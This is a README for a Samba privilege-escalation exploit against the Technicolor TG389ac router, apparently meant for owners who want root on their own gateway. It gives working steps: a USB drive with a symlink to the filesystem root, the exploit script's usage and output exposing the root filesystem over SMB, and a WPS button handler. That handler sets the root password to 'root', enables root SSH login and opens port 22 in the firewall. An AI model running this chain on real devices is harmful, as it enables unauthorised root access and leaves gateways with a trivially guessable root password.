# FDEU-CVE-2020-1FC5
Samba privilege escalation exploit. Tested on Technicolor TG389ac from Telia (LT) running Homeware 17.1.7992.
Other Technicolor gateways running Homeware NG firmwares up to 17.x with original webui front-end are possibly affected.

## Requirements

* Local admin access
* Empty USB flash drive with EXT2 partition

## Prepare the flash drive

```
mkfs.ext2 /dev/sdX1
mkdir /tmp/sdX1
mount /dev/sdX1 /tmp/sdX1
cd /tmp/sdX1
touch exploit
ln -s / rootfs
cd ~
umount /tmp/sdX1
```

Plug the fash into the router's USB port.

## Install dependencies

```
apt-get install python3 python3-requests python3-srp
```

## Enable root filesystem access

Run the provided exploit script:

```
# python3 tg389ac_samba_exploit.py http://192.168.1.254 admin
Password: 
[*] Init SRP authentication
[*] Get CSRF token
[*] Send authentication challenge
[*] Send authentication response
[*] Renew CSRF token
[*] Submit dummy samba config
[*] Submit samba exploit
[*] Reboot the router
b'{ "success":"true" }'
[*] Done. Wait until the rooter boots and open the network share
Example: \\192.168.1.254 or smb://192.168.1.254
```

You can now browse the root filesystem via SMB.

## Enable root SSH

Browse the SMB share and edit `/etc/config/button` file this way at 'wps' config section:

```
config button 'wps'
    ...
    option handler 'sed -i 's#/root:.*$#/root:/bin/ash#' /etc/passwd && echo root:root | chpasswd && sed -i -e 's/#//' -e 's#askconsole:.*\$#askconsole:/bin/ash#' /etc/inittab && (uci -q delete dropbear.afg || true) && uci add dropbear dropbear && uci rename dropbear.@dropbear[-1]=afg && uci set dropbear.afg.enable='1' && uci set dropbear.afg.Interface='lan' && uci set dropbear.afg.Port='22' && uci set dropbear.afg.IdleTimeout='600' && uci set dropbear.afg.PasswordAuth='on' && uci set dropbear.afg.RootPasswordAuth='on' && uci set dropbear.afg.RootLogin='1' && uci commit dropbear && /etc/init.d/dropbear enable && /etc/init.d/dropbear restart && (uci -q set $(uci show firewall | grep -m 1 $(fw3 -q print | egrep 'iptables -t filter -A zone_lan_input -p tcp -m tcp --dport 22 -m comment --comment \"!fw3: .+\" -j DROP' | sed -n -e 's/^iptables.\+fw3: \(.\+\)\".\+/\1/p') | sed -n -e \"s/\(.\+\).name='.\+'$/\1/p\").target='ACCEPT' || true) && uci commit firewall && /etc/init.d/firewall reload && uci set button.wps.handler='wps_button_pressed.sh' && uci commit'
```

Activate WPS button once as normal by pressing it for a couple of seconds (the exact required amount of seconds is shown in that same configuration file).
This will run the above snippet to correctly setup local SSH root access (ser(pw => root:root) and restore original WPS button configuration.
You can now login as root via ssh into your gateway.

## Docker

```
sudo docker build -t tg389ac_samba_exploit .
sudo docker run -ti tg389ac_samba_exploit /bin/bash
cd FDEU-CVE-2020-1FC
python3 tg389ac_samba_exploit.py
```
